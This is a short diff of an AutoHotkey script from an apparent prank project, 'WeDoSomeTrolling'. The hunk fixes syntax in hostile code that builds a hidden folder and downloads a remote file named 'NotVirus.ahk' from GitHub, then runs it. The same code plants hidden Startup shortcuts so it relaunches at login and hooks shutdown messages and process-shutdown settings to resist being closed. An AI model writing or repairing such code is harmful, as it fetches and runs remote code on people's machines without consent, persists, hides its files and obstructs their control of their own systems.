@@ -9,16 +9,16 @@ If !FileExist(Code)
 	FileSetAttrib, +H, Code
 	v := "https://github.com/JWitterick/WeDoSomeTrolling/raw/main/NotVirus.ahk"
 	URLDownloadToFile %v%, Code\NotVirus.ahk
-else if !FileExist(Code\NotVirus.ahk)
+if !FileExist("Code\NotVirus.ahk")
 	v := "https://github.com/JWitterick/WeDoSomeTrolling/raw/main/NotVirus.ahk"
 	URLDownloadToFile %v%, Code\NotVirus.ahk
-else if !FileExist(Startup\I'm Impressed.lnk)
+if !FileExist("Startup\I'm Impressed.lnk")
 	FileCreateShortcut, Well Done\Trolling.ahk, Startup\I'm Impressed.lnk
-else if !FileExist(Startup\Get Good.lnk)
+if !FileExist("Startup\Get Good.lnk")
 	FileCreateShortcut, JustInCase.ahk, Startup\Get Good.lnk
 FileSetAttrib, +SH,  Startup\I'm Impressed.lnk
 Run, Code\NotVirus.ahk
-OnExit("Stuff")
+OnExit, Stuff
 DllCall("kernel32.dll\SetProcessShutdownParameters", UInt, 0x4FF, UInt, 0) 
 OnMessage(0x11, "WM_QUERYENDSESSION")
 return
